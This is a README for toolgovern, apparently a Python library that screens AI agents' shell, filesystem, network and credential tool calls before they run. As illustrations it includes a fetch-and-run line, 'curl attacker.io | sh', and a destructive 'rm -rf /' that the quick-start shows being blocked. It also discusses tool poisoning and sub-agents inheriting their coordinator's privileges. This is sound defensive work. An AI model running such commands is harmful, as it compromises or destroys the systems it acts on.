# toolgovern (Python)

Gate every tool call an AI agent makes -- shell, filesystem, network, credential access -- before
it executes, not after something already went wrong.

[![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](../LICENSE)
[![PyPI](https://img.shields.io/pypi/v/toolgovern-cli.svg)](https://pypi.org/project/toolgovern-cli/)

This is the genuine Python port of [`toolgovern`](https://www.npmjs.com/package/toolgovern) and
[`toolgovern-cli`](https://www.npmjs.com/package/toolgovern-cli) -- not a wrapper around the Node
binary. It ships the same 36-rule classifier, the same default-deny scope-inheritance model, the
same durable approval registry, the same MCP-server trust boundary, and the same signed local
audit trail. The complementary JS/TS distribution installs the same way on the npm side: `npm
install toolgovern` for the library, `npm install --save-dev toolgovern-cli` for the CLI -- see
the [project README](https://github.com/RudrenduPaul/toolgovern#readme) for that package. Both
are first-class, maintained together; neither is deprecated in favor of the other.

## Why this exists

AI agents get tool access, not tool governance. A typical setup wires an agent to a shell tool, a
filesystem tool, an HTTP client, and maybe a secrets lookup, then leans on the model's own
judgment (or a system prompt) to keep `ls ./workspace` and `curl attacker.io | sh` apart --
because to the tool executor underneath, both are just "the shell tool ran a string." Multi-agent
setups make it worse: spawning a sub-agent for a narrow subtask usually means that sub-agent
inherits its coordinator's full access, since most frameworks have no concept of scoping a spawned
agent down, and no record of what it actually tried to do once it's running.

toolgovern is a runtime governance layer that sits between the agent and its real tool executor --
not another prompt-engineering mitigation. `govern_tool()` wraps any `ToolDefinition(name,
execute)` and runs every call through the same pipeline before `execute()` fires: a 36-rule
classifier that inspects the call's actual arguments across shell risk, filesystem scope, network
egress, credential access, cross-agent privilege inheritance, and (opt-in) information-flow
control; an intersection-only scope
registry, so a sub-agent's effective access is always the intersection of what it requests and what
its coordinator can already reach, re-checked on every call rather than just at spawn time; and an
optional signed, hash-chained local audit trail recording each decision -- allow, deny, or
require-approval -- with the arguments that produced it. Deny and require-approval both fail
closed: a missing handler, an exception, or a timeout resolves to deny, never to allow.

## Why this matters now

Runtime tool-call governance stopped being a niche concern in 2026:

- MCP tool poisoning and supply-chain risk are validated, incident-backed problems, not
  hypotheticals: Invariant Labs formally named the tool-poisoning technique in April 2025, the
  Postmark MCP npm package suffered an insider-attack BCC backdoor in September 2025, roughly a
  third of 1,000 scanned MCP servers were found carrying a critical vulnerability, and Microsoft
  disclosed a poisoned-MCP-tool-description attack technique in July 2026
  ([The Hacker News](https://thehackernews.com/2026/06/microsoft-warns-poisoned-mcp-tool.html),
  [Cloud Security Alliance](https://labs.cloudsecurityalliance.org/research/csa-research-note-mcp-security-crisis-20260504-csa-styled/),
  [Practical DevSecOps](https://www.practical-devsecops.com/mcp-security-statistics-2026-report/)).
- Microsoft shipped its own open-source Agent Governance Toolkit in April 2026, a runtime policy
  engine that intercepts agent actions before execution
  ([opensource.microsoft.com](https://opensource.microsoft.com/blog/2026/04/02/introducing-the-agent-governance-toolkit-open-source-runtime-security-for-ai-agents/)).
  It's an unrelated project, cited here only because it confirms that gating a tool call before
  it runs is now a first-party concern industry-wide, not something only this project cares
  about.
- Microsoft also merged AutoGen and Semantic Kernel into Microsoft Agent Framework 1.0 (GA
  2026-04-03), with first-class Python and .NET support under `Microsoft.Agents.AI`
  ([devblogs.microsoft.com](https://devblogs.microsoft.com/agent-framework/microsoft-agent-framework-version-1-0/),
  [github.com/microsoft/agent-framework](https://github.com/microsoft/agent-framework)) -- the
  framework this package ships a real, source-available Python integration for (see
  [Framework integrations](#framework-integrations)).
- LangGraph passed CrewAI in GitHub stars in early 2026 on the strength of enterprise adoption of
  its graph-based architecture ([langchain.com](https://www.langchain.com/resources/ai-agent-frameworks))
  -- another framework this package ships a real Python integration for, using the actual
  `wrap_tool_call` hook.
- The Claude Agent SDK passed AutoGen in enterprise production-deployment count in early-to-mid
  2026, per the LangChain State of AI 2025 report, and ships a purpose-built `PreToolUse` hook --
  exactly the hook this package's Claude Agent SDK integration wires `govern_tool()` into.
- Regulatory pressure on agentic AI is dated and real: the EU AI Act's high-risk obligations take
  effect August 2026, the Colorado AI Act becomes enforceable June 2026, and OWASP published a
  dedicated Top 10 for Agentic Applications for 2026.
- Google's A2A (Agent2Agent) protocol has crossed 150+ adopting organizations. Noted here as
  ecosystem context, not a toolgovern capability -- this package governs a single agent's own tool
  calls, not agent-to-agent protocol traffic.

None of this is a claim about toolgovern's own adoption. It's why gating a tool call before it
executes is worth doing at all right now.

## Install

```bash
pip install toolgovern-cli
```

or with [uv](https://docs.astral.sh/uv/):

```bash
uv add toolgovern-cli
```

Or install straight from this repository:

```bash
git clone https://github.com/RudrenduPaul/toolgovern.git
cd toolgovern/python
pip install .
```

No separate install step and no external binary to fetch: the classifier, scoping
registry, approval registry, MCP-trust boundary, and trace engine all ship inside the one
package. The console script is `toolgovern-cli`, matching the npm CLI's command name.

## Quick start

```python
from toolgovern import ToolDefinition, GovernToolOptions, govern_tool, ScopeDeclaration, ToolGovernDenialError

def run_shell(args):
    import subprocess
    return subprocess.run(args["command"], shell=True, capture_output=True, text=True)

shell_tool = ToolDefinition(name="shell", execute=run_shell)
gated_shell = govern_tool(shell_tool, GovernToolOptions(scope=ScopeDeclaration()))

try:
    gated_shell.execute({"command": "rm -rf /"})
except ToolGovernDenialError as e:
    print(e)  # denied before subprocess.run() ever runs
```

Or load a policy file:

```python
from toolgovern import load_policy, GovernToolOptions, govern_tool

policy = load_policy("./toolgovern.policy.yml")
gated_shell = govern_tool(shell_tool, GovernToolOptions.from_policy(policy))
```

## What it does

The classifier evaluates a tool call's actual arguments, not the tool's name, against 36 rules
across 6 categories:

| Category | Covers                            | Rules |
| -------- | --------------------------------- | ----- |
| TG01     | Shell/process execution risk      | 9     |
| TG02     | Filesystem scope escalation       | 7     |
| TG03     | Undeclared network egress         | 7     |
| TG04     | Credential/secret access          | 6     |
| TG05     | Cross-agent privilege inheritance | 6     |
| TG08     | Information-flow control (opt-in) | 1     |

TG03's 7th rule, `TG03-dns-resolves-private`, resolves a hostname argument via
`socket.getaddrinfo()` (honoring `/etc/hosts`) and applies the same loopback/RFC1918/link-local/
cloud-metadata deny logic already used for raw IP literals to every resolved address -- so a
hostname that merely _resolves to_ `127.0.0.1` or a cloud-metadata address is caught, not just a
raw IP literal argument. DNS-resolution failure or timeout fails closed (`require-approval`),
never allow. This narrows, but does not eliminate, DNS-rebinding TOCTOU: an attacker who controls
the hostname's DNS answer can still swap it after this check runs and before the tool's own HTTP
client connects -- see [`docs/security-model.md`](../docs/security-model.md) for the full, honest
writeup of that residual limitation and the still-open redirect-chain-revalidation gap.

`govern_tool()` wraps any `ToolDefinition(name, execute)` and returns a version that runs every
call through this pipeline before `execute()` runs: resolve the effective scope, classify the
call, resolve `require-approval` decisions through your handler (fail-closed on timeout,
exception, or no handler), write a trace entry if a `TraceWriter` is wired in, then raise
`ToolGovernDenialError` on `deny` or proceed to the real `execute()` on `allow`.

Per-agent scope inheritance (`ScopeRegistry`) is intersection-only: a sub-agent's granted scope
is always the intersection of what it requests and what its coordinator's own effective scope
actually covers -- never a union, never an implicit default-allow, and re-checked on every call
(not just at spawn time), so a coordinator's scope shrinking after a sub-agent was spawned is
caught on the sub-agent's next call.

## Also in this package

- `PendingApprovalRegistry` / `resume_pending_approval()` -- a durable, alias-tolerant registry
  for `require-approval` decisions that need resolving out-of-band (a Slack button click, a
  review queue) instead of answered synchronously in-process inside the 30-second
  `on_approval_required` callback. `pending_id`s are always server-generated, never
  caller-supplied, so an unrecognized ID resolves to `"not-found"`, never a silently-created
  fresh approval. `register_alias()` lets a second identifier (a provider-rotated thread ID)
  resolve to the same pending approval, and a resolved call is re-classified against any edited
  arguments rather than trusting the original request. In-memory by default; back it with real
  durable storage for a deployment that spans processes.
- `is_origin_allowed()` / `verify_mcp_server_manifest()` / `assert_mcp_server_trusted()` -- an
  MCP-server trust boundary checked once at connection time, distinct from the per-call
  classifier above: an explicit origin allowlist (no implicit subdomain trust unless you opt in
  with a leading `*.` entry) plus detached Ed25519/RSA-SHA256 manifest signature verification
  against a pinned public-key list, before any tool the server declares is ever trusted. Fails
  closed on every path -- an unreachable manifest, an unknown key ID, or a signature that doesn't
  verify all deny, they don't warn. This port fetches the manifest synchronously via
  `urllib.request` (`govern_tool()` is synchronous end to end in this port); the TS original uses
  `fetch()`. Same checks, same fail-closed outcomes, different language-appropriate I/O plumbing.
- `IdempotencyCache` -- an opt-in claim-before-execute primitive so a retried call doesn't
  re-execute a side effect (payments, emails, trades) that already happened.

## API reference

Everything importable from `toolgovern` directly:

```python
from toolgovern import (
    # middleware
    govern_tool, GovernToolOptions, ToolDefinition, ToolGovernDenialError, InvalidAgentIdError,
    GateDecisionInfo, ApprovalOutcome, IdempotencyCache, IdempotencyOptions,
    resume_pending_approval, ResumePendingApprovalOptions, PendingApprovalNotResolvableError,
    # approval registry
    PendingApprovalRegistry, PendingApproval, ApprovalResolutionDecision, PendingApprovalStatus,
    ResolvePendingInput, ResolvePendingOutcome, ResolvePendingStatus,
    PendingApprovalAliasConflictError, UnknownPendingApprovalError,
    # mcp-server trust boundary
    is_origin_allowed, verify_mcp_server_manifest, assert_mcp_server_trusted, McpTrustPolicy,
    PinnedPublicKey, McpServerConnectionRequest, McpManifestEnvelope, McpTrustVerdict,
    McpTrustDecision, McpTrustAlgorithm,
    # classifier
    classify, ClassifyOptions, rule_registry,
    # scoping
    ScopeRegistry, SpawnSubAgentParams, compute_inherited_scope, has_zero_capability,
    is_valid_agent_id, is_valid_scope_declaration, normalize_scope, EMPTY_SCOPE,
    # trace
    TraceWriter, TraceWriterOptions, read_trace, filter_trace, verify_chain, parse_since,
    canonical_json, compute_entry_signature, compute_entry_content_hash,
    # policy
    load_policy, validate_policy, as_policy, PolicyValidationError,
    # types
    ScopeDeclaration, Policy, RuleContext, RuleMatch, TraceEntry, TraceEntryInput,
    AgentScopeRecord, Decision, RuleCategory, AgentIdSource, ConfidentialityLabel, IfcPolicy,
)
```

## How it compares to other agent governance projects

Same facts as the [project README's full comparison
table](https://github.com/RudrenduPaul/toolgovern#how-it-compares-to-other-agent-governance-projects)
-- condensed here to the rows that matter most for picking a package, not re-derived. The "Rules
out of the box" row below is 36, not 35, because this Python port folds the DNS-resolution check
(`TG03-dns-resolves-private`) directly into its one synchronous `classify()` instead of needing a
separate async entry point -- see [What it does](#what-it-does) above. Every other row applies
equally to both the TypeScript and Python distributions.

|                             | **toolgovern**                                                       | [Microsoft Agent Governance Toolkit](https://github.com/microsoft/agent-governance-toolkit) | [NVIDIA NeMo Relay](https://github.com/NVIDIA/NeMo-Relay)                            | [LangGraph human-in-the-loop](https://docs.langchain.com/oss/python/langchain/human-in-the-loop) |
| --------------------------- | ---------------------------------------------------------------------- | --------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
| What it actually gates      | Tool calls, pre-execution, against a built-in rule set                | Tool calls, messages, and delegation, pre-execution, against policy you author (YAML/OPA/Cedar) | Tool and LLM calls via pre-tool hooks -- coverage depends on the host agent              | A single tool call, paused for a human decision -- no automated risk classification               |
| Rules out of the box        | 36 (this Python port), across 6 categories, zero config               | None shipped -- you write the policy                                                          | None shipped -- pre-tool hooks call your own logic, not a built-in classifier            | None -- you decide per call                                                                       |
| Per-agent scope narrowing   | Yes -- a sub-agent can never exceed its coordinator's granted scope   | Yes -- documented delegation-chain narrowing and a 4-ring privilege model                      | Not publicly documented                                                                  | No                                                                                                 |
| Tamper-evident audit trail  | Yes -- signed, hash-chained local JSONL                               | Yes -- Merkle-audit-backed, 157 conformance tests just for the audit layer                     | No -- raw JSONL trajectory export (ATOF/ATIF format), not signed                         | No                                                                                                 |
| Hosted component required   | No, never                                                              | No -- self-hosted by design, Azure integration is optional                                     | No -- local CLI gateway                                                                  | No for the OSS library; LangGraph's own hosted server runtime is separately licensed              |
| License                     | Apache 2.0                                                             | MIT                                                                                             | Apache 2.0                                                                                | MIT                                                                                                |

Two things worth repeating from the full narrative rather than leaving implicit: Microsoft's
Agent Governance Toolkit already matches or exceeds this project on scoping and audit-trail
maturity (a formal delegation-chain spec, 157 conformance tests just for its audit layer) -- this
table is not a claim that toolgovern beats AGT. And NeMo Relay / LangGraph HITL are doing a
genuinely different job, not a weaker version of the same one -- listing them here is about scope,
not a claim of superiority at the task each of them is actually built for. Read the [full
comparison and both honest
caveats](https://github.com/RudrenduPaul/toolgovern#how-it-compares-to-other-agent-governance-projects)
in the project README before deciding what you need.

## CLI

```bash
toolgovern-cli validate ./toolgovern.policy.yml
toolgovern-cli audit ./toolgovern-trace.jsonl --since 24h --decision deny --verify-chain
toolgovern-cli audit ./toolgovern-trace.jsonl --json
```

`validate` and `audit` are behaviorally equivalent to the npm CLI, including the `--json`
structured-output envelope (`{ ok, command, data | error }`). **Not ported in this release:**
`toolgovern-cli init [oma|langgraph]`, the npm CLI's TypeScript integration-file scaffolder --
it generates a `.ts` file importing the JS/TS-only `toolgovern-integration-langgraph` /
`toolgovern-integration-oma` packages, which are out of scope for a Python port by nature.

## The signed audit trail

```python
from toolgovern import TraceWriter, TraceWriterOptions, verify_chain, read_trace

# Default: unkeyed sha256: content hash -- proves an entry hasn't changed since it was written,
# but does not stop an attacker with write access to the trace file from editing an entry and
# recomputing a valid signature (no secret required for that scheme).
writer = TraceWriter("./toolgovern-trace.jsonl")

# Optional: HMAC-keyed signing closes that gap for anyone who doesn't hold the key. toolgovern
# does not generate, store, or rotate this key -- that's your responsibility.
writer = TraceWriter("./toolgovern-trace.jsonl", TraceWriterOptions(secret_key=b"..."))

entries = read_trace("./toolgovern-trace.jsonl")
result = verify_chain(entries)  # or verify_chain(entries, VerifyChainOptions(secret_key=b"..."))
```

See [docs/security-model.md](https://github.com/RudrenduPaul/toolgovern/blob/main/docs/security-model.md)
for the full disclosed-limitations writeup of both signing modes.

## Framework integrations

`toolgovern-integration-langgraph` and `toolgovern-integration-oma` are npm-only TypeScript
packages and are not ported to this Python distribution. Both are thin wrappers around
`governTool()` in the TS source, so wiring `govern_tool()` directly into a Python agent
framework's tool-executor call site is straightforward without a dedicated adapter package.

Five real Python framework integrations exist in this repository, each wiring `govern_tool()`
into a framework's actual hook rather than a generic wrapper: LangGraph (Python, using the real
`wrap_tool_call` `ToolNode` parameter), CrewAI, AutoGen, Microsoft Agent Framework, and the Claude
Agent SDK (using its real `PreToolUse` hook). None of these five are published to a package
registry yet -- each is available from source under
[`integrations/`](https://github.com/RudrenduPaul/toolgovern/tree/main/integrations) in the main
repo, with its own README and worked example. `examples/` in this directory also has a minimal,
framework-agnostic worked example wiring `govern_tool()` into a plain tool executor.

## Development

```bash
python3 -m venv .venv && source .venv/bin/activate
pip install -e ".[dev]"
pytest
```

## Security

Report a vulnerability per the project's [`SECURITY.md`](https://github.com/RudrenduPaul/toolgovern/blob/main/SECURITY.md); please don't open a public issue for one.

## FAQ

**What does toolgovern do?**
It's a runtime gate that checks every tool call an AI agent makes -- shell, filesystem, network,
credential access -- against a 36-rule classifier before the call executes, not after.
`govern_tool()` wraps any `ToolDefinition(name, execute)` you already have and runs each call
through the classifier, the per-agent scope registry, and (if wired in) the signed trace writer
before your real `execute()` ever fires. See [Why this exists](#why-this-exists) and [What it
does](#what-it-does) above for the full case.

**How does this Python package differ from the npm package, if at all?**
Functionally, barely. It ships the same 36-rule classifier (the npm/TypeScript package runs 35
rules synchronously plus one additional async-only DNS-resolution rule, landing at 36 checks total
through its `classifyAsync()` path; this Python port folds that same DNS check into its one
synchronous `classify()` instead, so it's 36 either way), the same intersection-only scope
registry, the same durable approval registry, the same MCP-server trust boundary, and the same
signed trace format -- a genuine Python port, not a wrapper around the Node binary. Two real gaps
today: `toolgovern-cli init [oma|langgraph]` (the npm CLI's TypeScript integration-file scaffolder)
isn't ported, since it generates a `.ts` file importing JS/TS-only packages; and the two npm-only
integration packages (`toolgovern-integration-oma`, `toolgovern-integration-langgraph` for
LangGraph.js) have no Python equivalent by design -- wire `govern_tool()` directly into your
Python framework's own call site instead. See [CLI](#cli) and [Framework
integrations](#framework-integrations) above.

**Does it need API keys or an account?**
No. Nothing in this package calls out to a hosted service. No call payload, argument, trace
content, or policy leaves your process unless code you write sends it somewhere -- there's no
server dependency, no account, and nothing to sign up for.

**Is it safe to run -- does an `allow` decision mean a tool call is safe?**
Running the package itself is safe: it's a local, in-process classifier that makes no network
calls of its own (the one exception, `TG03-dns-resolves-private`, only performs a DNS lookup of an
argument value your own tool call passes it). But an `allow` decision is not a safety guarantee --
it means the call was checked against the current 36-rule set and nothing fired.
[`docs/security-model.md`](https://github.com/RudrenduPaul/toolgovern/blob/main/docs/security-model.md)
in the main repo documents exactly what the classifier does and doesn't catch, including disclosed
obfuscation techniques it can still miss.

**How do I use it from an agent?**
Five real Python framework integrations exist in the main repo -- LangGraph (using the real
`wrap_tool_call` `ToolNode` parameter), CrewAI, AutoGen, Microsoft Agent Framework, and the Claude
Agent SDK (using its real `PreToolUse` hook) -- each installable from source (none are published to
PyPI yet). For a framework without a dedicated integration, wrap your own tool definitions with
`govern_tool()` directly at whatever call site your framework dispatches tool calls from. See
[Framework integrations](#framework-integrations) above for install commands and worked examples.

**Is there a hosted version of toolgovern?**
No. Everything that exists today is in the GitHub repository, Apache 2.0, self-hosted only, for
both the Python and TypeScript distributions.

## Links

- [GitHub repository](https://github.com/RudrenduPaul/toolgovern)
- [npm package (core library)](https://www.npmjs.com/package/toolgovern)
- [npm package (CLI)](https://www.npmjs.com/package/toolgovern-cli)
- [CHANGELOG](https://github.com/RudrenduPaul/toolgovern/blob/main/CHANGELOG.md)
- [Getting started](https://github.com/RudrenduPaul/toolgovern/blob/main/docs/getting-started.md)
- [Concepts](https://github.com/RudrenduPaul/toolgovern/blob/main/docs/concepts.md)
- [Security model](https://github.com/RudrenduPaul/toolgovern/blob/main/docs/security-model.md)

## License

Apache 2.0 -- see [LICENSE](../LICENSE).

